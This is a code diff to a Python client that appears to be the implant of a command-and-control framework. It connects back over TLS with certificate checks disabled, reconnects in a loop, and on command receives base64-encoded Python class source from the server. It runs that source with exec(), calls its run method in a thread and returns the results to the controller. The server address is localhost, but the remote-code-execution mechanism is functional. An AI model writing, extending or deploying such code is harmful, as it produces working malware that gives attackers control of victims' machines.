@@ -7,7 +7,7 @@ import random
 import string
 
 SERVER_IP = '127.0.0.1'
-SERVER_PORT = 5000
+SERVER_PORT = 5001
 
 g_bConnected = False
 
@@ -84,6 +84,23 @@ class C2P:
     def random_str(n_str_len = 10):
         return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(n_str_len))
 
+class Encoder:
+    @staticmethod
+    def bytes2b64str(buffer: bytes) -> str:
+        return base64.b64encode(buffer).decode('utf-8')
+
+    @staticmethod
+    def b64str2bytes(text: str) -> bytes:
+        return base64.b64decode(text)
+    
+    @staticmethod
+    def b64d2str(text: str) -> str:
+        return base64.b64decode(text.encode('utf-8'))
+    
+    @staticmethod
+    def stre2b64(text: str) -> str:
+        return base64.b64encode(text.encode('utf-8')).decode('utf-8')
+
 class Client:
     def __init__(self, sock: socket.socket) -> None:
         self.sock = sock
@@ -104,16 +121,10 @@ class Client:
         self.send(nCmd=nCmd, nParam=nParam, szMsg=C2P.random_str())
 
     def sendcipher(self, nCmd: int, nParam: int, szMsg: str):
-        pAES = self.get_aes()
-        abMsg = szMsg.encode()
-        abEncMsg = pAES.encrypt_cbc(abMsg)
-        szEncMsg = base64.b64encode(abEncMsg).decode('ascii')
-
-        self.send(nCmd=nCmd, nParam=nParam, szMsg=szEncMsg)
+        self.send(nCmd=nCmd, nParam=nParam, szMsg=szMsg)
 
     def sendserver(self, aMsg: list):
-        
-        #self.sendcipher(2, 3, '|'.join([Encoder.stre2b64(x) for x in aMsg]))
+        self.sendcipher(2, 3, '|'.join([Encoder.stre2b64(x) for x in aMsg]))
         pass
 
     def close(self):
@@ -128,7 +139,7 @@ def handler(clnt_sock: socket.socket):
 
     clnt = Client(clnt_sock)
 
-    clnt.sendcommand(0, 1)
+    clnt.sendcommand(1, 0) # Send hello handshake.
 
     while True:
         try:
@@ -157,23 +168,79 @@ def handler(clnt_sock: socket.socket):
                         nLength = tpHeader[2]
                         abMsg = c2p.get_msg()
 
-                        print(abMsg)
+                        if nCmd == 0:
+                            if nParam == 0:
+                                pass
+                            elif nParam == 1:
+                                pass
+                        
+                        elif nCmd == 1:
+                            if nParam == 1:
+                                clnt.sendcommand(1, 2) # send ok.
+
+                        elif nCmd == 2:
+                            if nParam == 0:
+                                clnt.sendcipher(2, 1, g_szTag)
+
+                            elif nParam == 2:
+                                abMsg = base64.b64decode(abMsg)
+                                szMsg = abMsg.decode('ascii')
+                                lsMsg = [base64.b64decode(x).decode('ascii') for x in szMsg.split('|')]
+
+                                szToken = lsMsg[0]
+                                szClassName = lsMsg[1]
+                                szClassStr = lsMsg[2]
+                                aParam = lsMsg[3:]
+
+                                if szClassName not in clnt.dic_class.keys():
+                                    exec(szClassStr, clnt.dic_class)
+
+                                    clnt.dic_class[szClassName] = clnt.dic_class[szClassName]()
+
+                                def foo():
+                                    objClass = clnt.dic_class[szClassName]
+                                    if not hasattr(objClass, 'run'):
+                                        return
+                                    
+                                    ret_val = objClass.run(clnt, szToken, aParam)
+
+                                    if ret_val == None:
+                                        return
+
+                                    assert isinstance(ret_val, list)
+
+                                    ret_val.insert(0, szToken)
+
+                                    clnt.sendserver(ret_val)
+                                
+                                threading.Thread(target=foo, args=[]).start()
+
                     except Exception as ex:
-                        pass
+                        print(str(ex))
         except Exception as ex:
             pass
 
 def main():
+    global g_bConnected
+
     while True:
-        if g_bConnected:
+        if not g_bConnected:
+            try:
+
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+
+                sock = socket.create_connection((SERVER_IP, SERVER_PORT))
+                tls_sock = context.wrap_socket(sock, server_hostname=SERVER_IP)
+
+                g_bConnected = True
+
+                handler(tls_sock)
+            except Exception as ex:
+                print(str(ex))
+
             time.sleep(1)
-            continue
-
-        with socket.create_connection((SERVER_IP, SERVER_PORT)) as sock:
-            with context.wrap_socket(sock, server_hostname=SERVER_IP) as ssock:
-                threading.Thread(target=handler, args=[ssock, ]).start()
-
-        time.sleep(1)
 
 if __name__ == '__main__':
     main()
